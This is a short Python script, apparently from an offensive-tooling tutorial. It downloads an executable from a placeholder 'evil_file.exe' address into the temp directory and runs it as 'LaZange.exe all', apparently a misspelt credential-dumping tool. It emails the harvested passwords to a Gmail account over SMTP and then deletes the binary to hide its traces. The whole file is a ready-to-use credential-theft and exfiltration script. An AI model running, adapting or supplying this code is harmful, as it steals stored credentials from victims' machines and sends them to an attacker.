#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name,"wb") as out_file:
        out_file.write(get_request.content)

def send_mail(email, password, message):
    try:       
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

        print("Email sent!")
    except Exception as e:
        print(f"error: {e}")


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("ip_adress/evil_file.exe") #we use for example LaZange
command = "LaZange.exe all"
result = subprocess.check_output("LaZange.exe all", shell=True)
send_mail("your_email@gmail.com", "Password", result)
os.remove("LaZange.exe")
